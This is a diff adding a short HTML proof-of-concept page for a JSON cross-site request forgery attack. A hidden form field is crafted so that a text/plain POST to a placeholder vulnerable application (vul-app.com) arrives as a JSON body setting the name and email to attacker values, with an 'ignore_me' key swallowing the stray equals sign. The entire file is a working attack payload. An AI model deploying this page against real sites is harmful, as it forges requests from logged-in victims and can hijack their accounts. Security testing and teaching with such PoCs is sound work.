@@ -1,0 +1,10 @@
+<html>
+<title>JSON CSRF POC</title>
+<center>
+<h1> JSON CSRF POC </h1>
+<form action=http://vul-app.com method=post enctype="text/plain" >
+<input name='{"name":"attacker","email":"attacker@gmail.com","ignore_me":"' value='test"}' type='hidden'>
+<input type=submit value="Submit">
+</form>
+</center>
+</html>
